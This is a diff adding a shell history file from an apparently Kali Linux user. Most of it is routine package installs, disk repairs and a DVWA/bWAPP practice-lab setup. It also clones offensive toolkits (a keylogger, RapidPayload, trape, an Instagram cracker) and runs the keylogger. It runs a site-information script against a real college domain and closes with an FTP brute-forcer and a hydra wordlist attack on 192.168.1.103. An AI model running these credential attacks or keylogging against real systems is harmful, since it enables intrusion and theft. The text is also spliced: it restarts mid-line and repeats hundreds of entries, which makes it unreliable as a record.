@@ -1,0 +1,2795 @@
+1) apt-get upgrade
+2) apt-get install vlc
+3) apt-get install bluetooth
+4) apt-get install bluez
+5) service bluetooth start
+6) bluez
+7) bluetooth
+8) service start bluetooth
+9) service start bluetooth
+10) service bluetooth restart
+11) systemctl restart bluetooth
+12) service bluetooth status
+13) apt-get install bluez
+15) apt-get install blueman
+16) systemctl restart bluetooth
+17) passwd
+18) systemctl restart pulseaudio
+23) apt-get install miro
+24) apt-get install xine
+25) apt-get install bomi
+26) apt-get install smplayer
+27) smplayer
+28) systemctl restart bluetooth
+29) firefox
+30) service bluetooth start
+31) apt-get install gnome
+32) wine
+33) apt-get install wine32
+34) wine --version
+35) apt-get remove libwine
+36) apt-get replace wine32
+37) apt-get replace libwine
+38) apt-get remove libwine
+39) apt-get install wine32
+40) apt-get install libwine
+41) apt-get install wine
+42) ./wine32.sh
+43) chmod wine32.sh
+44) chmod +x wine32.sh
+45) ./wine32.sh
+46) install wine32.sh
+47) apt-get install wine32.sh
+48) apt wine32.shi install
+49) ./wine32.sh
+50) ./wine32.sh
+51) wine /root/Downloads/1.exe
+52) firefox
+53) ps
+54) killall
+55) killall -u
+56) apt-get install wine
+57) wine
+58) wine --versi    1  apt-get install gparted
+    2  gparted
+    3  sudo add-apt-repository ppa:gezakovacs/ppa
+    4  apt-get install unebotin
+    5  apt-get install unetbotin
+    6  apt-get install unetbootn
+    7  apt-get install unetbootin
+    8  firefox netbootin.github.io
+    9  apt-get install gnome-screencast
+   10  apt-get install chrome
+   11  apt-get install chromium
+   12  chromium
+   13  su -l kali
+   14  ./google-chrome-stable --no-sandbox
+   15  chrome --no-sandbox
+   16  chromium --no-sandbox
+   17  xhost +
+   18  export DISPLAY='IP:0.0'
+   19  xhost +
+   20  export $DISPLAY 
+   21  service bluetooth start
+   22  chromium
+   23  chromium --no-sandbox
+   24  apt search java
+   25  apt search openjdk
+   26  apt search video
+   27  apt search wifi
+   28  apt search tool
+   29  apt search pdf
+   30  password
+   31  apt search password
+   32  apt search password crack
+   33  chromium
+   34  chromium --no-sandbox
+   35  hostname -I
+   36  apt-get install apktool
+   37  apktool
+   38  apktool -d thop.apk
+   39  apktool -h
+   40  apktool -d thop.apk -o /root/Desktop/name.apk
+   41  firefox
+   42  chrome
+   43  chromium --no-sandbox
+   44  http://192.168.43.1:1234/storage/emulated/0/som/?
+   45  vlc
+   46  service bluetooth start
+   47  vlc
+   48  service bluetooth start
+   49  fsck
+   50  errors=remount -o
+   51  errors=remount -o:
+   52  sudo -i
+   53  fdisk -l
+   54  root@kali:~# fsck
+   55  umount /
+   56  umount -f  /
+   57  fdisk -l
+   58  clear
+   59  umount /dev/mmcblk0p2
+   60  sudo -i
+   61  umount /dev/mmcblk0p2
+   62  sudo umount -l /dev/mmcblk0p2
+   63  fsck /dev/mmcblk0p2
+   64  e2fsck /dev/mmcblk0p2
+   65  sudo mount -l /dev/mmcblk0p2
+   66  sudo mount /dev/mmcblk0p2
+   67  clear
+   68  dev/mmcblk0p2
+   69  fsck dev/mmcblk0p2
+   70  fsck -p dev/mmcblk0p2
+   71  fsck -p /dev/mmcblk0p2
+   72  fsck /dev/mmcblk0p2
+   73  fsck
+   74  clear
+   75  fdisk -l
+   76  reboot
+   77  apt-get install firefox
+   78  apt-get install update
+   79  apt-get update
+   80  apt-get upgrade
+   81  apt-get autoremove
+   82  apt-get autoremove--purge
+   83  apt-get autoremove --purge
+   84  firefox
+   85  apktool -d wifi.apk
+   86  apktool d wifi.apk
+   87  apt-get install kxml
+   88  bluefish
+   89  apt-get install bluefish
+   90  sudo snap install android-studio --classic
+   91  sudo APT install android-studio --classic
+   92  sudo apt install android-studio --classic
+   93  sudo apt install android-studio
+   94  apt search android
+   95  sudo apt install anbox
+   96  ANBOX
+   97  anbox
+   98  anbox -h
+   99  apt-get install golang-github-anacrolix-dms-dev
+  100  anbox wifi.apk
+  101  sudo add-apt-repository ppa:morphis/anbox-support
+  102  sudo apt update
+  103  sudo modprobe ashmem_linux
+  104  sudo cp anbox.conf /etc/modules-load.d/
+  105  sudo cp 99-anbox.rules /lib/udev/rules.d/
+  106  sudo cp -rT ashmem /usr/src/anbox-ashmem-1
+  107  sudo cp -rT binder /usr/src/anbox-binder-1
+  108  sudo dkms install anbox-ashmem/1
+  109  sudo dkms install anbox-binder/1
+  110  sudo modprobe ashmem_linux
+  111  sudo modprobe binder_linux
+  112  lsmod | grep -e ashmem_linux -e binder_linux
+  113  ls -alh /dev/binder /dev/ashmem
+  114  sudo apt install dkms
+  115  sudo apt install linux-headers-amd64
+  116  linux-headers-amd64
+  117  anbox session-manager
+  118  sudo anbox container-manager
+  119  clear
+  120  systemctl start anbox-container-manager.service
+  121  sudo anbox container-manager
+  122  anbox session-manager
+  123  sudo snap restart anbox
+  124  systemctl enable anbox-container-manager.service 
+  125  anbox session-manager
+  126  sudo anbox container-manager
+  127  sudo systemctl start anbox-container-manager.service
+  128  sudo anbox container-manager
+  129  anbox session-manager
+  130  clear
+  131  modinfo binder_linux
+  132  modinfo ashmem_linux
+  133  anbox check-features
+  134  apt-get purge anbox
+  135  apt-get purge snap
+  136  apt-get update firefox
+  137  apt-get install firefox
+  138  apt-get install firefox-esr
+  139  apt-get install codelobster
+  140  apt-get install geany
+  141  GEANY
+  142  geany
+  143  apt-get installdex2jar
+  144  apt-get install dex2jar
+  145  apt-get install dex2jar -y
+  146  dex2jar wifi.apk
+  147  dex2jar -h
+  148  dex2jar -d wifi.apk
+  149  d2j-dex2jar -o wifi.apk
+  150  d2j-dex2jar -d wifi.apk
+  151  apt-search xml
+  152  apt search xml
+  153  apt-get install xml
+  154  apt-get install xml2
+  155  xml2
+  156  xml2 -h
+  157  apt-get purge  xml2
+  158  hostname -I
+  159  157.33.176.120
+  160  ftp 157.33.176.120
+  161  ftp 127.0.0.1
+  162  ftp 127.0.0.1:2121
+  163  ftp 127.0.0.1
+  164  ftp 127.0.0.1:2121
+  165  python install.py
+  166  apt-get purge trity
+  167  python install.py
+  168  apt-get install ftp
+  169  ftp
+  170  ftp 157.33.176.120
+  171  127.0.0.1
+  172  ftp 127.0.0.1
+  173  clear
+  174  apt update
+  175  apt install git
+  176  cd /root/Desktop
+  177  git clone https://github.com/rajkumardusad/Tool-X.git
+  178  cd Tool-X
+  179  chmod +x install.aex
+  180  sh install.aex
+  181  tool-x
+  182  Tool-X
+  183  py istall.py
+  184  py install.py
+  185  python install.py
+  186  python main.py
+  187  cd ..
+  188  git clone https://github.com/unkn0wnh4ckr/hackers-tool-kit
+  189  cd hackers-tool-kit
+  190  python install.py
+  191  chmod uhsckinsta.exe
+  192  chmod u+w hsckinsta.exe
+  193  chmod u+w hackinsta.exe
+  194  hackinsta.exe
+  195  cd..
+  196  cd ..
+  197  git clone https://github.com/king-hacking/King-Hacking.git
+  198  cd King-Hacking
+  199  bash King-Tools.sh
+  200  chromium --no-sandbox
+  201  python install.py
+  202  trity
+  203  apt-get purge python
+  204  apt-get install python
+  205  clear
+  206  cd /root/Desktop
+  207  git clone https://github.com/entynetproject/quack.git
+  208  cd quack
+  209  chmod +x install.sh
+  210  ./install.sh
+  211  quak
+  212  quack
+  213  pip requirement.txt
+  214  service bluetooth start
+  215  python r.py
+  216  cd /root/Desktop
+  217  git clone git clone https://github.com/thehackingsage/hacktronian.git
+  218  git clone https://github.com/thehackingsage/hacktronian.git
+  219  cd hacktronian
+  220  chmod +x install.sh
+  221  ./install.sh
+  222  hacktronian
+  223  cd /root
+  224  cd /root/Desktop
+  225  git clone https://github.com/SofianeHamlaoui/Lockdoor-Framework.git
+  226  git clone https://github.com/entynetproject/ghost.git
+  227  git clone
+  228  git clone https://github.com/aydinnyunus/Keylogger.git
+  229  \
+  230  git clone https://github.com/entynetproject/ehtools.git
+  231  git clone https://github.com/Viralmaniar/Remote-Desktop-Caching-.git
+  232  git clone https://github.com/AngelSecurityTeam/RapidPayload.git
+  233  python get_website.py
+  234  python get_website.py adarshcollege208.ac.in
+  235  get_website.py adarshcollege208.ac.in
+  236  history
+  237  200
+  238  chromium --no-sandbox
+  239  python keylogger.py
+  240  chmod u+x keylogger.py
+  241  python keylogger.py
+  242  chmod u+x install.sh
+  243  ./install.sh
+  244  chmod u+x install.sh
+  245  bash install.sh
+  246  ehtools
+  247  ifconfig
+  248  apt-get install snap
+  249  sudo add-apt-repository ppa:morphis/anbox-support
+  250  sudo apt install linux-headers-generic anbox-modules-dkms
+  251  sudo add-apt-repository ppa:morphis/anbox-support
+  252  sudo apt install linux-headers-generic anbox-modules-dkms
+  253  sudo modprobe ashmem_linux
+  254  clear
+  255  snap info anbox
+  256  sudo snap install --devmode --beta anbox
+  257  anbox
+  258  apt search anbox
+  259  anbox session-manager
+  260  ashmen
+  261  apt search ashmem
+  262  sudo apt-get  install linux-headers-generic anbox-modules-dkms
+  263  sudo apt-get install --devmode --beta anbox
+  264  apt-get install  ashmem_linux
+  265  sudo modprobe binder_linux
+  266  sudo apt-get modprobe binder_linux
+  267  sudo apt-get install modprobe binder_linux
+  268  git clone https://github.com/jofpin/trape.git
+  269  python2 trape.py -h
+  270  pip install -f requirement.txt
+  271  python trape.py -h
+  272  cd ?download
+  273  cd /Download
+  274  cd /root/Download
+  275  cd /root/Downloads
+  276  git clone https://github.com/boxug/trape.git
+  277  cd /trape
+  278  pip installl -r requirement.txt
+  279  apt-get install pip
+  280  - pip installl -r requirement.txt
+  281  apt-get install Flask
+  282  apt-get install flask
+  283  python trape.oy
+  284  ls
+  285  python trape.py
+  286  python trape.py -u google.com -p 80
+  287  https://github.com/Kecatoca/Trape.git
+  288  git clone https://github.com/Kecatoca/Trape.git
+  289  firefox-esr trape github
+  290  service bluetooth start
+  291  firefox
+  292  service bluetooth start
+  293  chromium --no-sandbox
+  294  apt-get install rambox
+  295  apt-get install freetuxtv
+  296  apt-get update
+  297  apt-get update --fix-missing
+  298  fsck
+  299  /dev/mcblk0p2
+  300  umount /dev/mcblk0p2
+  301  umount /dev /mmcblk0p2
+  302  umount /dev/mmcblk0p2
+  303  reboot
+  304  apt search tv
+  305  apt-get install freetuxtv
+  306  apt-get update
+  307  apt-get update --fix-missing
+  308  fsck
+  309  umount /dev/mmcblk0p2
+  310  apt-get install freetuxtv
+  311  apt-get install gimp
+  312  apt-get install tv
+  313  apt-get install tvtime
+  314  apt-get install oreotv
+  315  pt-get upgrade
+  316  apt-get upgrade
+  317  apt-get autoremove
+  318  SWHUTDOWN
+  319  shutdown
+  320  service bluetooth start'
+  321  service bluetooth start
+  322  service bluetooth start
+  323  service kdeconnect start
+  324  service bluetooth start
+  325  man bash
+  326  apt-get install burp
+  327  burp
+  328  burp[1641] Could not find ssl_cert /etc/burp/ssl_cert-client.pem: No such file or directory
+  329  burp -a -l
+  330  apt-get purge  burp
+  331  apt-get purge burp
+  332  fsck
+  333  clear
+  334  fsck
+  335  umount /root/
+  336  fsck /root
+  337  fsck /root/
+  338  e2fsck -b /root/
+  339  e2fsck -b 8193 /root/
+  340  reboot
+  341  apt-get update
+  342  apt-get upgrade -y
+  343  apt-get autoremove
+  344  service apache2 srart
+  345  service apache2 start
+  346  cd /var/www/dvwa
+  347  cd /var/www/dvwa/
+  348  cd /var/www/html
+  349  ls
+  350  chmod 777
+  351  chmod 777 dvwa
+  352  ls
+  353  chmod -R 777 dvwa
+  354  chmod -R 777 dvwa/
+  355  service mysql start
+  356  service mysql start
+  357  apt-get install mysql
+  358  burpsuit
+  359  burpsuite
+  360  apt-get update
+  361  apt-get upgrade
+  362  apt-get full-upgrade
+  363  apt-get install mysql-server
+  364  ps -ef | grep mysql | grep -v grep
+  365  clear
+  366  sudo apt-get purge mysql-server
+  367  sudo apt-get autoremove
+  368  sudo apt-get autoclean
+  369  sudo apt-get update
+  370  sudo apt-get install mysql-server
+  371  apt-get remove mysql
+  372  apt-get remove mysqlserver
+  373  apt-get remove mysql-server
+  374  apt-get purge mysql-server
+  375  apt-get install mysql-server
+  376  apt-get install mariadb
+  377  apt-get install mariadb-server
+  378  service mysql start
+  379  chmod -R 777 bwapp
+  380  chmod -R 777 dvwa
+  381  service apache2 restart
+  382  service mysql  restart
+  383  mysql
+  384  use mysql;
+  385  mysql;
+  386  mysql -u dvwa -p
+  387  chmod -R 777 dvwa
+  388  service apache2 start
+  389  service mysql start
+  390  apt-get install mysql
+  391  apt-get install myql
+  392  service mysql start
+  393  service apache2 start
+  394  service mysql start
+  395  service apache2 start
+  396  cd /var/www/html
+  397  ls
+  398  chmod -R 777 /dvwa
+  399  chmod -R 777 /dvwa/
+  400  chmod -R 777 dvwa
+  401  ls
+  402  chmod -R 777 dvwa
+  403  apt-get install php
+  404  ls
+  405  cd dvwa
+  406  ls
+  407  service apache2 restart
+  408  service mysql restart
+  409  sudo mysql -u root
+  410  service apache2 restart
+  411  service mysql restart
+  412  service apache2 start
+  413  service mysql start
+  414  apt-get -y install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php
+  415  mysql
+  416  chmod -R 777 dvwa
+  417  chmod -R 777 dvwa/
+  418  service mysql start
+  419  mysql -u root -p
+  420  clear
+  421  cd /etc/php
+  422  ls
+  423  cd 7.3
+  424  ls
+  425  cd apache2
+  426  ls
+  427  nano php.ini
+  428  mysql -u root -p
+  429  service apache2 start
+  430  service mysql start
+  431  service mysql stop
+  432  service apache2 stop
+  433  service mysql start
+  434  service apache2 start
+  435  apt sarch browser
+  436  apt search browser
+  437  apt-get purge fiefox-esr
+  438  apt-get purge firefox-esr
+  439  apt-get install firefox-esr
+  440  apt-get install surf
+  441  surf
+  442  apt-get remove purge  surf
+  443  apt-get remove purge surf
+  444  apt-get --remove purge surf
+  445  service postgresql staret
+  446  service postgresql start
+  447  service mysql start
+  448  service apache2 start
+  449  sudo apt-get install php7.3-mysql
+  450  service mysql restart
+  451  service apache2 restart
+  452  chmod a+w settings.php
+  453  apt-get install php
+  454  apt-get install php7.3
+  455  apt-get install php7.3-dom
+  456  apt-get install php7.3-gd
+  457  service apache2 stop
+  458  service mysql restart
+  459  service apache2 start
+  460  apt-get install php7.3-mbstring
+  461  mkdir sites/default/files
+  462  mkdir /var/www/html/sites/default/files
+  463  chmod a+w sites/default/files
+  464  chmod a+w /var/www/html/sites/default/files
+  465  chmod a+w /var/www/html/sites/default/settings.php
+  466  mysql -u root -p
+  467  history >> /root/Desktop/hstory.txt
+  468  chmod a+w bwapp
+  469  chmod -R 777 bewapp
+  470  chmod -R 777 bwapp
+  471  burpsuite
+  472  mysql -u root -p
+  473  proxychains -h
+  474  apt-get install openconnect
+  475  omnidb-server
+  476  apt-get install omnidb-server
+  477  apt-get install plasma
+  478  apt-get install     1  apt-get install gparted
+    2  gparted
+    3  sudo add-apt-repository ppa:gezakovacs/ppa
+    4  apt-get install unebotin
+    5  apt-get install unetbotin
+    6  apt-get install unetbootn
+    7  apt-get install unetbootin
+    8  firefox netbootin.github.io
+    9  apt-get install gnome-screencast
+   10  apt-get install chrome
+   11  apt-get install chromium
+   12  chromium
+   13  su -l kali
+   14  ./google-chrome-stable --no-sandbox
+   15  chrome --no-sandbox
+   16  chromium --no-sandbox
+   17  xhost +
+   18  export DISPLAY='IP:0.0'
+   19  xhost +
+   20  export $DISPLAY 
+   21  service bluetooth start
+   22  chromium
+   23  chromium --no-sandbox
+   24  apt search java
+   25  apt search openjdk
+   26  apt search video
+   27  apt search wifi
+   28  apt search tool
+   29  apt search pdf
+   30  password
+   31  apt search password
+   32  apt search password crack
+   33  chromium
+   34  chromium --no-sandbox
+   35  hostname -I
+   36  apt-get install apktool
+   37  apktool
+   38  apktool -d thop.apk
+   39  apktool -h
+   40  apktool -d thop.apk -o /root/Desktop/name.apk
+   41  firefox
+   42  chrome
+   43  chromium --no-sandbox
+   44  http://192.168.43.1:1234/storage/emulated/0/som/?
+   45  vlc
+   46  service bluetooth start
+   47  vlc
+   48  service bluetooth start
+   49  fsck
+   50  errors=remount -o
+   51  errors=remount -o:
+   52  sudo -i
+   53  fdisk -l
+   54  root@kali:~# fsck
+   55  umount /
+   56  umount -f  /
+   57  fdisk -l
+   58  clear
+   59  umount /dev/mmcblk0p2
+   60  sudo -i
+   61  umount /dev/mmcblk0p2
+   62  sudo umount -l /dev/mmcblk0p2
+   63  fsck /dev/mmcblk0p2
+   64  e2fsck /dev/mmcblk0p2
+   65  sudo mount -l /dev/mmcblk0p2
+   66  sudo mount /dev/mmcblk0p2
+   67  clear
+   68  dev/mmcblk0p2
+   69  fsck dev/mmcblk0p2
+   70  fsck -p dev/mmcblk0p2
+   71  fsck -p /dev/mmcblk0p2
+   72  fsck /dev/mmcblk0p2
+   73  fsck
+   74  clear
+   75  fdisk -l
+   76  reboot
+   77  apt-get install firefox
+   78  apt-get install update
+   79  apt-get update
+   80  apt-get upgrade
+   81  apt-get autoremove
+   82  apt-get autoremove--purge
+   83  apt-get autoremove --purge
+   84  firefox
+   85  apktool -d wifi.apk
+   86  apktool d wifi.apk
+   87  apt-get install kxml
+   88  bluefish
+   89  apt-get install bluefish
+   90  sudo snap install android-studio --classic
+   91  sudo APT install android-studio --classic
+   92  sudo apt install android-studio --classic
+   93  sudo apt install android-studio
+   94  apt search android
+   95  sudo apt install anbox
+   96  ANBOX
+   97  anbox
+   98  anbox -h
+   99  apt-get install golang-github-anacrolix-dms-dev
+  100  anbox wifi.apk
+  101  sudo add-apt-repository ppa:morphis/anbox-support
+  102  sudo apt update
+  103  sudo modprobe ashmem_linux
+  104  sudo cp anbox.conf /etc/modules-load.d/
+  105  sudo cp 99-anbox.rules /lib/udev/rules.d/
+  106  sudo cp -rT ashmem /usr/src/anbox-ashmem-1
+  107  sudo cp -rT binder /usr/src/anbox-binder-1
+  108  sudo dkms install anbox-ashmem/1
+  109  sudo dkms install anbox-binder/1
+  110  sudo modprobe ashmem_linux
+  111  sudo modprobe binder_linux
+  112  lsmod | grep -e ashmem_linux -e binder_linux
+  113  ls -alh /dev/binder /dev/ashmem
+  114  sudo apt install dkms
+  115  sudo apt install linux-headers-amd64
+  116  linux-headers-amd64
+  117  anbox session-manager
+  118  sudo anbox container-manager
+  119  clear
+  120  systemctl start anbox-container-manager.service
+  121  sudo anbox container-manager
+  122  anbox session-manager
+  123  sudo snap restart anbox
+  124  systemctl enable anbox-container-manager.service 
+  125  anbox session-manager
+  126  sudo anbox container-manager
+  127  sudo systemctl start anbox-container-manager.service
+  128  sudo anbox container-manager
+  129  anbox session-manager
+  130  clear
+  131  modinfo binder_linux
+  132  modinfo ashmem_linux
+  133  anbox check-features
+  134  apt-get purge anbox
+  135  apt-get purge snap
+  136  apt-get update firefox
+  137  apt-get install firefox
+  138  apt-get install firefox-esr
+  139  apt-get install codelobster
+  140  apt-get install geany
+  141  GEANY
+  142  geany
+  143  apt-get installdex2jar
+  144  apt-get install dex2jar
+  145  apt-get install dex2jar -y
+  146  dex2jar wifi.apk
+  147  dex2jar -h
+  148  dex2jar -d wifi.apk
+  149  d2j-dex2jar -o wifi.apk
+  150  d2j-dex2jar -d wifi.apk
+  151  apt-search xml
+  152  apt search xml
+  153  apt-get install xml
+  154  apt-get install xml2
+  155  xml2
+  156  xml2 -h
+  157  apt-get purge  xml2
+  158  hostname -I
+  159  157.33.176.120
+  160  ftp 157.33.176.120
+  161  ftp 127.0.0.1
+  162  ftp 127.0.0.1:2121
+  163  ftp 127.0.0.1
+  164  ftp 127.0.0.1:2121
+  165  python install.py
+  166  apt-get purge trity
+  167  python install.py
+  168  apt-get install ftp
+  169  ftp
+  170  ftp 157.33.176.120
+  171  127.0.0.1
+  172  ftp 127.0.0.1
+  173  clear
+  174  apt update
+  175  apt install git
+  176  cd /root/Desktop
+  177  git clone https://github.com/rajkumardusad/Tool-X.git
+  178  cd Tool-X
+  179  chmod +x install.aex
+  180  sh install.aex
+  181  tool-x
+  182  Tool-X
+  183  py istall.py
+  184  py install.py
+  185  python install.py
+  186  python main.py
+  187  cd ..
+  188  git clone https://github.com/unkn0wnh4ckr/hackers-tool-kit
+  189  cd hackers-tool-kit
+  190  python install.py
+  191  chmod uhsckinsta.exe
+  192  chmod u+w hsckinsta.exe
+  193  chmod u+w hackinsta.exe
+  194  hackinsta.exe
+  195  cd..
+  196  cd ..
+  197  git clone https://github.com/king-hacking/King-Hacking.git
+  198  cd King-Hacking
+  199  bash King-Tools.sh
+  200  chromium --no-sandbox
+  201  python install.py
+  202  trity
+  203  apt-get purge python
+  204  apt-get install python
+  205  clear
+  206  cd /root/Desktop
+  207  git clone https://github.com/entynetproject/quack.git
+  208  cd quack
+  209  chmod +x install.sh
+  210  ./install.sh
+  211  quak
+  212  quack
+  213  pip requirement.txt
+  214  service bluetooth start
+  215  python r.py
+  216  cd /root/Desktop
+  217  git clone git clone https://github.com/thehackingsage/hacktronian.git
+  218  git clone https://github.com/thehackingsage/hacktronian.git
+  219  cd hacktronian
+  220  chmod +x install.sh
+  221  ./install.sh
+  222  hacktronian
+  223  cd /root
+  224  cd /root/Desktop
+  225  git clone https://github.com/SofianeHamlaoui/Lockdoor-Framework.git
+  226  git clone https://github.com/entynetproject/ghost.git
+  227  git clone
+  228  git clone https://github.com/aydinnyunus/Keylogger.git
+  229  \
+  230  git clone https://github.com/entynetproject/ehtools.git
+  231  git clone https://github.com/Viralmaniar/Remote-Desktop-Caching-.git
+  232  git clone https://github.com/AngelSecurityTeam/RapidPayload.git
+  233  python get_website.py
+  234  python get_website.py adarshcollege208.ac.in
+  235  get_website.py adarshcollege208.ac.in
+  236  history
+  237  200
+  238  chromium --no-sandbox
+  239  python keylogger.py
+  240  chmod u+x keylogger.py
+  241  python keylogger.py
+  242  chmod u+x install.sh
+  243  ./install.sh
+  244  chmod u+x install.sh
+  245  bash install.sh
+  246  ehtools
+  247  ifconfig
+  248  apt-get install snap
+  249  sudo add-apt-repository ppa:morphis/anbox-support
+  250  sudo apt install linux-headers-generic anbox-modules-dkms
+  251  sudo add-apt-repository ppa:morphis/anbox-support
+  252  sudo apt install linux-headers-generic anbox-modules-dkms
+  253  sudo modprobe ashmem_linux
+  254  clear
+  255  snap info anbox
+  256  sudo snap install --devmode --beta anbox
+  257  anbox
+  258  apt search anbox
+  259  anbox session-manager
+  260  ashmen
+  261  apt search ashmem
+  262  sudo apt-get  install linux-headers-generic anbox-modules-dkms
+  263  sudo apt-get install --devmode --beta anbox
+  264  apt-get install  ashmem_linux
+  265  sudo modprobe binder_linux
+  266  sudo apt-get modprobe binder_linux
+  267  sudo apt-get install modprobe binder_linux
+  268  git clone https://github.com/jofpin/trape.git
+  269  python2 trape.py -h
+  270  pip install -f requirement.txt
+  271  python trape.py -h
+  272  cd ?download
+  273  cd /Download
+  274  cd /root/Download
+  275  cd /root/Downloads
+  276  git clone https://github.com/boxug/trape.git
+  277  cd /trape
+  278  pip installl -r requirement.txt
+  279  apt-get install pip
+  280  - pip installl -r requirement.txt
+  281  apt-get install Flask
+  282  apt-get install flask
+  283  python trape.oy
+  284  ls
+  285  python trape.py
+  286  python trape.py -u google.com -p 80
+  287  https://github.com/Kecatoca/Trape.git
+  288  git clone https://github.com/Kecatoca/Trape.git
+  289  firefox-esr trape github
+  290  service bluetooth start
+  291  firefox
+  292  service bluetooth start
+  293  chromium --no-sandbox
+  294  apt-get install rambox
+  295  apt-get install freetuxtv
+  296  apt-get update
+  297  apt-get update --fix-missing
+  298  fsck
+  299  /dev/mcblk0p2
+  300  umount /dev/mcblk0p2
+  301  umount /dev /mmcblk0p2
+  302  umount /dev/mmcblk0p2
+  303  reboot
+  304  apt search tv
+  305  apt-get install freetuxtv
+  306  apt-get update
+  307  apt-get update --fix-missing
+  308  fsck
+  309  umount /dev/mmcblk0p2
+  310  apt-get install freetuxtv
+  311  apt-get install gimp
+  312  apt-get install tv
+  313  apt-get install tvtime
+  314  apt-get install oreotv
+  315  pt-get upgrade
+  316  apt-get upgrade
+  317  apt-get autoremove
+  318  SWHUTDOWN
+  319  shutdown
+  320  service bluetooth start'
+  321  service bluetooth start
+  322  service bluetooth start
+  323  service kdeconnect start
+  324  service bluetooth start
+  325  man bash
+  326  apt-get install burp
+  327  burp
+  328  burp[1641] Could not find ssl_cert /etc/burp/ssl_cert-client.pem: No such file or directory
+  329  burp -a -l
+  330  apt-get purge  burp
+  331  apt-get purge burp
+  332  fsck
+  333  clear
+  334  fsck
+  335  umount /root/
+  336  fsck /root
+  337  fsck /root/
+  338  e2fsck -b /root/
+  339  e2fsck -b 8193 /root/
+  340  reboot
+  341  apt-get update
+  342  apt-get upgrade -y
+  343  apt-get autoremove
+  344  service apache2 srart
+  345  service apache2 start
+  346  cd /var/www/dvwa
+  347  cd /var/www/dvwa/
+  348  cd /var/www/html
+  349  ls
+  350  chmod 777
+  351  chmod 777 dvwa
+  352  ls
+  353  chmod -R 777 dvwa
+  354  chmod -R 777 dvwa/
+  355  service mysql start
+  356  service mysql start
+  357  apt-get install mysql
+  358  burpsuit
+  359  burpsuite
+  360  apt-get update
+  361  apt-get upgrade
+  362  apt-get full-upgrade
+  363  apt-get install mysql-server
+  364  ps -ef | grep mysql | grep -v grep
+  365  clear
+  366  sudo apt-get purge mysql-server
+  367  sudo apt-get autoremove
+  368  sudo apt-get autoclean
+  369  sudo apt-get update
+  370  sudo apt-get install mysql-server
+  371  apt-get remove mysql
+  372  apt-get remove mysqlserver
+  373  apt-get remove mysql-server
+  374  apt-get purge mysql-server
+  375  apt-get install mysql-server
+  376  apt-get install mariadb
+  377  apt-get install mariadb-server
+  378  service mysql start
+  379  chmod -R 777 bwapp
+  380  chmod -R 777 dvwa
+  381  service apache2 restart
+  382  service mysql  restart
+  383  mysql
+  384  use mysql;
+  385  mysql;
+  386  mysql -u dvwa -p
+  387  chmod -R 777 dvwa
+  388  service apache2 start
+  389  service mysql start
+  390  apt-get install mysql
+  391  apt-get install myql
+  392  service mysql start
+  393  service apache2 start
+  394  service mysql start
+  395  service apache2 start
+  396  cd /var/www/html
+  397  ls
+  398  chmod -R 777 /dvwa
+  399  chmod -R 777 /dvwa/
+  400  chmod -R 777 dvwa
+  401  ls
+  402  chmod -R 777 dvwa
+  403  apt-get install php
+  404  ls
+  405  cd dvwa
+  406  ls
+  407  service apache2 restart
+  408  service mysql restart
+  409  sudo mysql -u root
+  410  service apache2 restart
+  411  service mysql restart
+  412  service apache2 start
+  413  service mysql start
+  414  apt-get -y install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php
+  415  mysql
+  416  chmod -R 777 dvwa
+  417  chmod -R 777 dvwa/
+  418  service mysql start
+  419  mysql -u root -p
+  420  clear
+  421  cd /etc/php
+  422  ls
+  423  cd 7.3
+  424  ls
+  425  cd apache2
+  426  ls
+  427  nano php.ini
+  428  mysql -u root -p
+  429  service apache2 start
+  430  service mysql start
+  431  service mysql stop
+  432  service apache2 stop
+  433  service mysql start
+  434  service apache2 start
+  435  apt sarch browser
+  436  apt search browser
+  437  apt-get purge fiefox-esr
+  438  apt-get purge firefox-esr
+  439  apt-get install firefox-esr
+  440  apt-get install surf
+  441  surf
+  442  apt-get remove purge  surf
+  443  apt-get remove purge surf
+  444  apt-get --remove purge surf
+  445  service postgresql staret
+  446  service postgresql start
+  447  service mysql start
+  448  service apache2 start
+  449  sudo apt-get install php7.3-mysql
+  450  service mysql restart
+  451  service apache2 restart
+  452  chmod a+w settings.php
+  453  apt-get install php
+  454  apt-get install php7.3
+  455  apt-get install php7.3-dom
+  456  apt-get install php7.3-gd
+  457  service apache2 stop
+  458  service mysql restart
+  459  service apache2 start
+  460  apt-get install php7.3-mbstring
+  461  mkdir sites/default/files
+  462  mkdir /var/www/html/sites/default/files
+  463  chmod a+w sites/default/files
+  464  chmod a+w /var/www/html/sites/default/files
+  465  chmod a+w /var/www/html/sites/default/settings.php
+  466  mysql -u root -p
+  467  history >> /root/Desktop/hstory.txt
+  468  chmod a+w bwapp
+  469  chmod -R 777 bewapp
+  470  chmod -R 777 bwapp
+  471  burpsuite
+  472  mysql -u root -p
+  473  proxychains -h
+  474  apt-get install openconnect
+  475  omnidb-server
+  476  apt-get install omnidb-server
+  477  apt-get install plasma
+  478  apt-get install plasma-browser
+  479  apt-get install smtube
+  480  smtube
+  481  apt-get remove smtube
+  482  apt-get purgwe smtube
+  483  apt-get purge smtube
+  484  twinkle
+  485  apt-get install webext-proxy-switcher
+  486  webext-proxy-switcher
+  487  apt-get install safari
+  488  apt-get install surf
+  489  surf
+  490  apt-get purge surf
+  491  apt-get install kiosk
+  492  apt search s
+  493  apt-get install iridium
+  494  apt-get install iridium-browser
+  495  apt-get install tor-browser
+  496  sudo apt-get install -y google-chrome-stable
+  497  sudo apt-get install -y google-chrome-beta
+  498  sudo apt-get install -y google-chrome
+  499  sudo apt-get install -y opera
+  500  sudo apt-get install opera
+  501  apt search opera
+  502  sudo apt-get install vivaldi
+  503  sudo apt-get install midori
+  504  midori
+  505  sudo apt-get --remove purge midori
+  506  sudo apt-get install falkon
+  507  falkon
+  508  apt-get install sandbox
+  509  apt-get install --no-sandbox
+  510  falkon --no-sandbox
+  511  sudo apt-get --remove purge falkon
+  512  apt-get install opera
+  513  apt-get install opera-browser
+  514  apt-get install opera-stable
+  515  apt-get install vivaldi
+  516  apt-get install qupzilla
+  517  qupzilla
+  518  apt-get purge  qupzilla
+  519  apt-get install brave
+  520  apt-get install waterfox
+  521  apt-get install yandex
+  522  apt-get install yandex-browser
+  523  apt search yandex
+  524  apt search browser
+  525  apt search proxy
+  526  git clone https://github.com/GitHackTools/FTPBruter
+  527  cd FTPBruter
+  528  chmod +x ftpbruter.py
+  529  python3 ftpbruter.py
+  530  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp/root/Desktop/wordlist-master/
+  531  clear
+  532  cd..
